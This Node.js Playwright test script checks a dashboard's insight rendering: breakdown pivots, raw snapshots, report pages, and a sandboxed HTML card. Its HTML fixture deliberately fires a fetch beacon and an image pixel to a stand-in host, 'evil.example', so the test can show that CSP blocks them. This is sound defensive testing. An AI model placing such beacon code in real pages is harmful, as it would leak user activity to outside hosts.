#!/usr/bin/env node
/**
 * Breakdown contract (matrix/v1) + html/v1 hybrid + My Reports — runtime proof.
 *
 *   npm run build && npm run verify:lab-breakdown-reports
 *
 * Boots the REAL dashboard server on an isolated scratch vault (fake HOME, no
 * user state, no network sources — every insight is a local script), drives it
 * with Playwright, and proves what the unit suite cannot:
 *
 *   1. a `matrix/v1` insight renders the PIVOT on the board (rows × columns
 *      from the dims, n chips, low-sample fade) and its detail panel carries
 *      the swap-dims / copy-as-Markdown affordances;
 *   2. snapshot honesty on existing renders: a single-date `raw` insight shows
 *      NO Time column — the date appears once, in the caption;
 *   3. the html/v1 card body draws in a sandboxed iframe whose inline script
 *      RUNS (the kit is usable) while a fetch + <img> beacon in the same html
 *      produces ZERO network requests (sandbox + `default-src 'none'` CSP) —
 *      and the detail panel shows the typed data twin next to the iframe;
 *   4. My Reports: the board toolbar lists the report, `/lab/reports/<slug>`
 *      renders sections full-width with "as of" stamps, and the date navigator
 *      shows the honest empty state for a date before the first sync — no
 *      interpolation, ever.
 *
 * Same harness contract as the other verify scripts: real server, isolated
 * fake HOME, COLLECT-DON'T-FAIL-FAST reporting. Screenshots land in
 * <scratch>/shots for eyeballing.
 */

import { spawn, execFileSync } from 'node:child_process';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const SCRATCH = join(tmpdir(), 'dreamcontext-verify-lab-breakdown');
const HOME = join(SCRATCH, 'home');
const PROJ = join(SCRATCH, 'proj');
const SHOTS = join(SCRATCH, 'shots');
const PORT = 45747;
const CLI = join(REPO, 'dist', 'index.js');
const LAB = join(PROJ, '_dream_context', 'lab');

const results = [];
const ok = (name, cond, detail = '') => results.push(`${cond ? 'PASS' : 'FAIL'} ${name}${detail && !cond ? ` — ${detail}` : ''}`);

function dc(args, opts = {}) {
  return execFileSync('node', [CLI, ...args], {
    cwd: PROJ, env: { ...process.env, HOME }, stdio: ['ignore', 'pipe', 'pipe'], ...opts,
  }).toString();
}

// The html fixture ACTIVELY tries to exfiltrate: a fetch beacon and an image
// pixel to a sentinel host. The CSP must stop both before a request exists.
// ('<\\/script>' keeps the closing tag from ending the template literally.)
const HTML_BODY = [
  '<div class="lk-stat"><span class="lk-label">Fancy</span><span class="lk-value" id="v">42</span></div>',
  '<script>',
  'document.getElementById("v").dataset.ran = "1";',
  'try { fetch("https://evil.example/beacon"); } catch (e) {}',
  'var i = new Image(); i.src = "https://evil.example/pixel.gif";',
  '<\/script>',
].join('');

const MATRIX_SCRIPT = `export default async function (ctx) {
  return {
    kind: 'matrix/v1',
    dims: [
      { key: 'funnel', label: 'Funnel' },
      { key: 'language', label: 'Language' },
    ],
    rows: [
      { d: { funnel: 'F3000', language: 'TR' }, v: 119000, n: 4200 },
      { d: { funnel: 'F3000', language: 'EN' }, v: 84000, n: 3100 },
      { d: { funnel: 'F4000', language: 'TR' }, v: 52000, n: 1800 },
      { d: { funnel: 'F4000', language: 'EN' }, v: 31000, n: 25 },
    ],
    total: { v: 286000, n: 9125 },
  };
}`;

const SNAPSHOT_RAW_SCRIPT = `export default async function (ctx) {
  const t = '2026-08-25';
  return [
    { name: 'F3000 TR', points: [{ t, v: 119000 }] },
    { name: 'F3000 EN', points: [{ t, v: 84000 }] },
    { name: 'F4000 TR', points: [{ t, v: 52000 }] },
  ];
}`;

const HTML_HYBRID_SCRIPT = `export default async function (ctx) {
  return {
    data: [{ name: 'fancy', points: [{ t: '2026-08-24', v: 40 }, { t: '2026-08-25', v: 42 }] }],
    html: ${JSON.stringify(HTML_BODY)},
  };
}`;

function setup() {
  rmSync(SCRATCH, { recursive: true, force: true });
  mkdirSync(join(PROJ, '_dream_context', 'state'), { recursive: true });
  mkdirSync(join(HOME, '.dreamcontext'), { recursive: true });
  mkdirSync(SHOTS, { recursive: true });
  writeFileSync(join(HOME, '.dreamcontext', '.secrets.json'), JSON.stringify({ github: { token: 'gho_fake_verify_token', login: 'verify-user' } }));
  execFileSync('git', ['init', '-q'], { cwd: PROJ });
  dc(['vaults', 'add', 'proj', PROJ], { cwd: REPO });
  try { dc(['init', '--yes']); } catch { /* scaffold best-effort — lab only needs lab/ */ }

  mkdirSync(join(LAB, 'scripts'), { recursive: true });
  const seeds = [
    ['upsell-breakdown', 'Upsell breakdown', 'breakdown', MATRIX_SCRIPT],
    ['snapshot-raw', 'Raw snapshot', 'raw', SNAPSHOT_RAW_SCRIPT],
    ['fancy-html', 'Fancy html card', 'number', HTML_HYBRID_SCRIPT],
  ];
  for (const [slug, title, render] of seeds) {
    dc(['lab', 'create', slug, '--title', title, '--render', render, '--adapter', 'script', '--group', 'Verify']);
  }
  for (const [slug, , , script] of seeds) {
    writeFileSync(join(LAB, 'scripts', `${slug}.mjs`), `${script}\n`, 'utf-8');
  }
  dc(['lab', 'sync', '--all']);

  dc([
    'lab', 'report', 'create', 'daily-report',
    '--title', 'Daily Product Report',
    '--description', 'Runtime verify fixture',
    '--date-nav', 'daily',
    '--insights', 'upsell-breakdown,fancy-html',
  ]);
}

async function waitForServer(url, ms = 20000) {
  const until = Date.now() + ms;
  while (Date.now() < until) {
    try { const r = await fetch(url); if (r.ok) return; } catch { /* not up yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error(`server did not come up at ${url}`);
}

const cardOf = (page, title) => page.locator('.lab-card', { hasText: title }).first();

async function main() {
  setup();
  const server = spawn('node', [CLI, 'dashboard', '--no-open', '-p', String(PORT)], {
    cwd: PROJ, env: { ...process.env, HOME, DREAMCONTEXT_DESKTOP: '1' }, stdio: 'ignore',
  });
  try {
    await waitForServer(`http://127.0.0.1:${PORT}/api/lab`);
    const browser = await chromium.launch();
    const page = await browser.newPage({ viewport: { width: 1600, height: 1000 } });

    // Exfiltration accounting for the whole session (board AND detail panel).
    // Chromium REGISTERS an <img> request before CSP kills it, so a bare
    // `request` count would flag the block itself as a leak. What matters:
    // nothing may FINISH (reach the network), and every registered attempt
    // must die with the `csp` block reason. fetch() is killed even earlier
    // (no request event at all).
    let escaped = 0;
    let cspBlocked = 0;
    page.on('requestfinished', (req) => { if (req.url().includes('evil.example')) escaped += 1; });
    page.on('requestfailed', (req) => {
      if (!req.url().includes('evil.example')) return;
      if (req.failure()?.errorText === 'csp') cspBlocked += 1;
      else escaped += 1;
    });

    const shoot = async (name) => page.screenshot({ path: join(SHOTS, `${name}.png`), fullPage: true });

    await page.goto(`http://127.0.0.1:${PORT}/?vault=proj`, { waitUntil: 'networkidle' });
    if (await page.locator('.announcements-modal-scrim').count()) {
      await page.keyboard.press('Escape');
      await page.waitForTimeout(300);
    }
    await page.getByText('Insights', { exact: true }).first().click();
    await page.waitForTimeout(1200);
    await shoot('board');

    // ── 1. the breakdown pivot on the board ────────────────────────────────
    const bdCard = cardOf(page, 'Upsell breakdown');
    ok('breakdown card renders a pivot table', await bdCard.locator('table').count() >= 1);
    ok('pivot columns come from dims[1] (TR/EN headers)',
      await bdCard.locator('th', { hasText: 'TR' }).count() >= 1
      && await bdCard.locator('th', { hasText: 'EN' }).count() >= 1);
    ok('pivot rows come from dims[0] (funnel values)',
      (await bdCard.innerText()).includes('F3000') && (await bdCard.innerText()).includes('F4000'));
    ok('cells carry n chips', (await bdCard.innerText()).includes('n=4,200'));
    ok('the n<30 cell renders low-sample faded',
      await bdCard.locator('td[title*="low-sample"], td[title*="noise"]').count() >= 1);
    ok('the total renders', (await bdCard.innerText()).includes('286,000'));

    // ── 2. snapshot honesty on raw ─────────────────────────────────────────
    const rawCard = cardOf(page, 'Raw snapshot');
    const rawText = await rawCard.innerText();
    ok('single-date raw shows the Snapshot caption once', rawText.includes('Snapshot · 2026-08-25'));
    ok('single-date raw dropped the Time column',
      await rawCard.locator('th', { hasText: 'Time' }).count() === 0);
    ok('raw still shows Series and Value columns',
      await rawCard.locator('th', { hasText: 'Series' }).count() === 1
      && await rawCard.locator('th', { hasText: 'Value' }).count() === 1);

    // ── 3. the html/v1 sandboxed body ──────────────────────────────────────
    const htmlCard = cardOf(page, 'Fancy html card');
    const iframe = htmlCard.locator('iframe.lab-html-body');
    ok('html card draws the sandboxed iframe', await iframe.count() === 1);
    ok('iframe sandbox is exactly allow-scripts', await iframe.getAttribute('sandbox') === 'allow-scripts');
    const srcdoc = (await iframe.getAttribute('srcdoc')) ?? '';
    ok('srcdoc embeds the no-network CSP', srcdoc.includes("default-src 'none'"));
    ok('srcdoc embeds the lk- class kit', srcdoc.includes('.lk-stat'));
    const frame = page.frameLocator('iframe.lab-html-body');
    ok('the iframe inline script RAN (kit is usable)',
      await frame.locator('#v').getAttribute('data-ran') === '1');
    await page.waitForTimeout(800);
    ok('no beacon reached the network (fetch killed pre-request, img blocked by CSP)',
      escaped === 0, `${escaped} beacon(s) escaped`);
    ok('the img beacon attempt died with the csp block reason', cspBlocked >= 1,
      `${cspBlocked} csp-blocked (expected ≥1 — the fixture fires an <img> per iframe)`);

    // Detail panel: html body + the typed data twin, side by side.
    await htmlCard.locator('.lab-card-title').click();
    await page.waitForTimeout(600);
    const panel = page.locator('.idp-panel');
    ok('detail panel keeps the sandboxed body', await panel.locator('iframe.lab-html-body').count() === 1);
    ok('detail panel shows the typed data TWIN below the html',
      (await panel.locator('.idp-chart').count()) >= 2
      && (await panel.innerText()).includes('the same numbers'));
    await shoot('html-detail');
    await page.keyboard.press('Escape');
    await page.waitForTimeout(300);

    // Breakdown detail affordances.
    await cardOf(page, 'Upsell breakdown').locator('.lab-card-title').click();
    await page.waitForTimeout(600);
    const bdPanel = page.locator('.idp-panel');
    ok('breakdown detail has swap dims', (await bdPanel.innerText()).includes('swap dims'));
    ok('breakdown detail has copy as Markdown', (await bdPanel.innerText()).includes('copy as Markdown'));
    await shoot('breakdown-detail');
    await page.keyboard.press('Escape');
    await page.waitForTimeout(300);

    // ── 4. My Reports ──────────────────────────────────────────────────────
    ok('the board toolbar shows the Reports entry', await page.locator('.lab-board-reports-toggle').count() === 1);
    await page.locator('.lab-board-reports-toggle').click();
    await page.locator('.lab-board-reports-item', { hasText: 'Daily Product Report' }).click();
    await page.waitForTimeout(1200);
    ok('the report page is ROUTED (pushState contract)',
      new URL(page.url()).pathname === '/lab/reports/daily-report', page.url());
    ok('the report title renders', await page.locator('.report-title', { hasText: 'Daily Product Report' }).count() === 1);
    const reportText = await page.locator('.report-page').innerText();
    ok('the report section renders the breakdown pivot full-width',
      await page.locator('.report-page table th', { hasText: 'TR' }).count() >= 1);
    ok('items carry the as-of stamp', reportText.includes('as of'));
    await shoot('report-live');

    // Window inheritance (owner decision 2026-09-01): a past date RE-MEASURES
    // — the date navigator IS the measurement window. The page first shows the
    // honest "not measured yet" state, then a window sync fills it with data
    // measured over the selected window (never a silently substituted other
    // window). The old snapshot-as-of semantics live on under `window: own`
    // (pinned by the unit suite).
    await page.locator('input[aria-label="Window end"]').fill('2020-01-01');
    await page.waitForTimeout(700);
    const pendingText = await page.locator('.report-page').innerText();
    // Local scripts can settle inside the first poll, so at this instant the
    // page shows EITHER the honest un-measured/measuring state OR the already
    // re-measured window — what it must never show is yesterday's live window
    // passed off as the selected one.
    ok('a past date never passes another window off as the selected one',
      pendingText.includes('not measured yet') || pendingText.includes('Measuring')
      || pendingText.includes('Dec 31 – Jan 1') || !pendingText.includes('as of'));
    // Let the window sync job settle and the sections fill.
    await page.waitForTimeout(5000);
    const datedText = await page.locator('.report-page').innerText();
    ok('the past date re-measured: the pivot renders for the selected window',
      await page.locator('.report-page table th', { hasText: 'TR' }).count() >= 1);
    ok('the re-measured items wear the selected window on their chip',
      datedText.includes('Dec 31 – Jan 1'));
    await shoot('report-dated-window');

    // Back to live: the pivot returns.
    await page.locator('.report-page button', { hasText: 'Live' }).click();
    await page.waitForTimeout(900);
    ok('returning to Live restores the data',
      await page.locator('.report-page table th', { hasText: 'TR' }).count() >= 1);

    // Back to the board via the page's own control.
    await page.locator('.report-back').click();
    await page.waitForTimeout(600);
    ok('back returns to the board', await page.locator('.lab-card').count() === 3);

    await browser.close();
  } finally {
    server.kill('SIGTERM');
  }

  const failed = results.filter((r) => r.startsWith('FAIL'));
  console.log(results.join('\n'));
  console.log(`\n${results.length - failed.length}/${results.length} checks passed. Shots: ${SHOTS}`);
  process.exit(failed.length === 0 ? 0 : 1);
}

main().catch((err) => {
  console.error(err);
  console.log(results.join('\n'));
  process.exit(1);
});
